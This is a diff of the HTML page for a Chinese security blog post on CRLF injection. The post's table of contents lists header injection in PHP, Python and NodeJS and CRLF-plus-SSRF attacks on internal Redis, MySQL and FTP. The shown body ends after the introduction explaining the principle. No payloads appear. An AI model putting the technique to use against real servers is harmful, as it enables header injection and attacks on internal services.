@@ -1,170 +1,312 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CRLF注入漏洞 | Blog of AyaN0</title><meta name="author" content="AyaN0"><meta name="copyright" content="AyaN0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CRLF注入漏洞CRLF，感觉好高级的名词啊。。 但是如果我告诉你CR是回车，LF是换行，是不是感觉就好多了? CRLF是怎么造成漏洞的呢在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制 HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些恶意的HTTP">
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ayan0.top","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.24.1","exturl":false,"sidebar":{"position":"left","width_expanded":280,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="CRLF注入漏洞 CRLF，感觉好高级的名词啊。。 但是如果我告诉你CR是回车，LF是换行，是不是感觉就好多了?">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CRLF注入漏洞">
 <meta property="og:url" content="https://ayan0.top/2025/07/14/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
 <meta property="og:site_name" content="Blog of AyaN0">
-<meta property="og:description" content="CRLF注入漏洞CRLF，感觉好高级的名词啊。。 但是如果我告诉你CR是回车，LF是换行，是不是感觉就好多了? CRLF是怎么造成漏洞的呢在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制 HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些恶意的HTTP">
+<meta property="og:description" content="CRLF注入漏洞 CRLF，感觉好高级的名词啊。。 但是如果我告诉你CR是回车，LF是换行，是不是感觉就好多了?">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://ayan0.top/img/ari.webp">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250714145107226.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t017291c25d0d4a0fc3.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t014cac7ba1ff8544a8.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250714174138058.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t01820e6d889f5f8892.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250714181611956.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t01833dd0e566e383b1.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t0196c013fcb593f5dc.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t01aac9eb365660564a.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t0131e105fae41b3683.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t010ad518fe0047f40f.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t01de6686f7292b3fcb.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t012736c55bfe08049f.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t01a5cac758fd4e71af.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t016508ddd55f7008c4.png">
 <meta property="article:published_time" content="2025-07-14T10:47:04.000Z">
 <meta property="article:modified_time" content="2025-07-14T10:49:49.290Z">
 <meta property="article:author" content="AyaN0">
 <meta property="article:tag" content="-Web -HTTP">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://ayan0.top/img/ari.webp"><script type="application/ld+json">{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "CRLF注入漏洞",
-  "url": "https://ayan0.top/2025/07/14/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/",
-  "image": "https://ayan0.top/img/ari.webp",
-  "datePublished": "2025-07-14T10:47:04.000Z",
-  "dateModified": "2025-07-14T10:49:49.290Z",
-  "author": [
-    {
-      "@type": "Person",
-      "name": "AyaN0",
-      "url": "https://ayan0.top/"
-    }
-  ]
-}</script><link rel="shortcut icon" href="/img/logo.png"><link rel="canonical" href="https://ayan0.top/2025/07/14/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
-    (() => {
-      
-    const saveToLocal = {
-      set: (key, value, ttl) => {
-        if (!ttl) return
-        const expiry = Date.now() + ttl * 86400000
-        localStorage.setItem(key, JSON.stringify({ value, expiry }))
-      },
-      get: key => {
-        const itemStr = localStorage.getItem(key)
-        if (!itemStr) return undefined
-        const { value, expiry } = JSON.parse(itemStr)
-        if (Date.now() > expiry) {
-          localStorage.removeItem(key)
-          return undefined
-        }
-        return value
-      }
-    }
+<meta name="twitter:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250714145107226.png">
 
-    window.btf = {
-      saveToLocal,
-      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
-        const script = document.createElement('script')
-        script.src = url
-        script.async = true
-        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
-        script.onload = script.onreadystatechange = () => {
-          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
-        }
-        script.onerror = reject
-        document.head.appendChild(script)
-      }),
-      getCSS: (url, id) => new Promise((resolve, reject) => {
-        const link = document.createElement('link')
-        link.rel = 'stylesheet'
-        link.href = url
-        if (id) link.id = id
-        link.onload = link.onreadystatechange = () => {
-          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
-        }
-        link.onerror = reject
-        document.head.appendChild(link)
-      }),
-      addGlobalFn: (key, fn, name = false, parent = window) => {
-        if (!true && key.startsWith('pjax')) return
-        const globalFn = parent.globalFn || {}
-        globalFn[key] = globalFn[key] || {}
-        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
-        parent.globalFn = globalFn
-      }
-    }
+
+<link rel="canonical" href="https://ayan0.top/2025/07/14/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ayan0.top/2025/07/14/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","path":"2025/07/14/CRLF注入漏洞/","title":"CRLF注入漏洞"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CRLF注入漏洞 | Blog of AyaN0</title>
   
-      
-      const activateDarkMode = () => {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      const activateLightMode = () => {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
 
-      btf.activateDarkMode = activateDarkMode
-      btf.activateLightMode = activateLightMode
 
-      const theme = saveToLocal.get('theme')
-    
-          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+      <img class="custom-logo-image" src="/images/lly.jpg" alt="Blog of AyaN0">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Blog of AyaN0</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
         
-      
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
-      }
-    
-      
-    const detectApple = () => {
-      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
-        document.documentElement.classList.add('apple')
-      }
-    }
-    detectApple()
   
-    })()
-  </script><script>const GLOBAL_CONFIG = {
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
-  copy: {
-    success: '复制成功',
-    error: '复制失败',
-    noSupport: '浏览器不支持'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  dateSuffix: {
-    just: '刚刚',
-    min: '分钟前',
-    hour: '小时前',
-    day: '天前',
-    month: '个月前'
-  },
-  copyright: undefined,
-  lightbox: 'null',
-  Snackbar: undefined,
-  infinitegrid: {
-    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
-    buttonText: '加载更多'
-  },
-  isPhotoFigcaption: false,
-  islazyloadPlugin: false,
-  isAnchor: false,
-  percent: {
-    toc: true,
-    rightside: false,
-  },
-  autoDarkmode: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'CRLF注入漏洞',
-  isHighlightShrink: false,
-  isToc: true,
-  pageType: 'post'
-}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/mea3.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ari.webp" onerror="this.onerror=null;this.src='/img/dacapo.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ari.webp" alt="Logo"><span class="site-name">Blog of AyaN0</span></a><a class="nav-page-title" href="/"><span class="site-name">CRLF注入漏洞</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CRLF注入漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-14T10:47:04.000Z" title="发表于 2025-07-14 18:47:04">2025-07-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-14T10:49:49.290Z" title="更新于 2025-07-14 18:49:49">2025-07-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="CRLF注入漏洞"><a href="#CRLF注入漏洞" class="headerlink" title="CRLF注入漏洞"></a>CRLF注入漏洞</h1><p>CRLF，感觉好高级的名词啊。。</p>
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#crlf%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text"> CRLF注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#crlf%E6%98%AF%E6%80%8E%E4%B9%88%E9%80%A0%E6%88%90%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%91%A2"><span class="nav-number">1.1.</span> <span class="nav-text"> CRLF是怎么造成漏洞的呢</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#location%E5%AD%97%E6%AE%B5%E7%9A%84302%E8%B7%B3%E8%BD%AC"><span class="nav-number">1.2.</span> <span class="nav-text"> Location字段的302跳转</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-fsockopen-%E5%87%BD%E6%95%B0"><span class="nav-number">1.3.</span> <span class="nav-text"> PHP fsockopen() 函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8host%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.1.</span> <span class="nav-text"> 在Host头部注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-soapclient-%E7%B1%BB"><span class="nav-number">1.4.</span> <span class="nav-text"> PHP SoapClient 类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8-user-agent-%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.1.</span> <span class="nav-text"> 在 User-Agent 头部注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E9%80%81-post-%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="nav-number">1.4.2.</span> <span class="nav-text"> 发送 POST 数据包</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python-urllib-crlf-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2019-9740"><span class="nav-number">1.5.</span> <span class="nav-text"> Python urllib CRLF 注入漏洞（CVE-2019-9740）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8-http-%E7%8A%B6%E6%80%81%E8%A1%8C%E6%B3%A8%E5%85%A5%E6%81%B6%E6%84%8F%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5"><span class="nav-number">1.5.1.</span> <span class="nav-text"> 在 HTTP 状态行注入恶意首部字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8-http-%E7%8A%B6%E6%80%81%E8%A1%8C%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4-http-%E8%AF%B7%E6%B1%82"><span class="nav-number">1.5.2.</span> <span class="nav-text"> 在 HTTP 状态行注入完整 HTTP 请求</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nodejs-%E4%B8%AD%E7%9A%84-crlf-injection"><span class="nav-number">1.6.</span> <span class="nav-text"> NodeJS 中的 CRLF Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#http-%E8%AF%B7%E6%B1%82%E8%B7%AF%E5%BE%84%E4%B8%AD%E7%9A%84-unicode-%E5%AD%97%E7%AC%A6%E6%8D%9F%E5%9D%8F"><span class="nav-number">1.6.1.</span> <span class="nav-text"> HTTP 请求路径中的 Unicode 字符损坏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unicode-%E5%AD%97%E7%AC%A6%E6%8D%9F%E5%9D%8F%E9%80%A0%E6%88%90%E7%9A%84-http-%E6%8B%86%E5%88%86%E6%94%BB%E5%87%BB"><span class="nav-number">1.6.2.</span> <span class="nav-text"> Unicode 字符损坏造成的 HTTP 拆分攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8-http-%E7%8A%B6%E6%80%81%E8%A1%8C%E6%B3%A8%E5%85%A5%E6%81%B6%E6%84%8F%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5-2"><span class="nav-number">1.6.3.</span> <span class="nav-text"> 在 HTTP 状态行注入恶意首部字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8-http-%E7%8A%B6%E6%80%81%E8%A1%8C%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4-http-%E8%AF%B7%E6%B1%82-2"><span class="nav-number">1.6.4.</span> <span class="nav-text"> 在 HTTP 状态行注入完整 HTTP 请求</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crlf-ssrf-%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8"><span class="nav-number">1.7.</span> <span class="nav-text"> CRLF + SSRF 攻击内网应用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-redis"><span class="nav-number">1.7.1.</span> <span class="nav-text"> 攻击 Redis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-mysql"><span class="nav-number">1.7.2.</span> <span class="nav-text"> 攻击 MySQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BBftp"><span class="nav-number">1.7.3.</span> <span class="nav-text"> 攻击FTP</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="AyaN0"
+      src="/images/lly.jpg">
+  <p class="site-author-name" itemprop="name">AyaN0</p>
+  <div class="site-description" itemprop="description">不断的前进的人:只有0次摔倒或无数次的爬起</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kisakiayano" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kisakiayano" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1594453512@qq.com" title="E-Mail → 1594453512@qq.com" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ayan0.top/2025/07/14/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lly.jpg">
+      <meta itemprop="name" content="AyaN0">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog of AyaN0">
+      <meta itemprop="description" content="不断的前进的人:只有0次摔倒或无数次的爬起">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CRLF注入漏洞 | Blog of AyaN0">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CRLF注入漏洞
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-07-14 18:47:04 / 修改时间：18:49:49" itemprop="dateCreated datePublished" datetime="2025-07-14T18:47:04+08:00">2025-07-14</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>25k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>45 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="crlf注入漏洞"><a class="markdownIt-Anchor" href="#crlf注入漏洞"></a> CRLF注入漏洞</h1>
+<p>CRLF，感觉好高级的名词啊。。</p>
 <p>但是如果我告诉你CR是回车，LF是换行，是不是感觉就好多了?</p>
-<h2 id="CRLF是怎么造成漏洞的呢"><a href="#CRLF是怎么造成漏洞的呢" class="headerlink" title="CRLF是怎么造成漏洞的呢"></a>CRLF是怎么造成漏洞的呢</h2><p>在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制 HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些恶意的HTTP Header，如会话Cookie，甚至可以注入一些HTML代码。这就是CRLF注入漏洞的核心原理。</p>
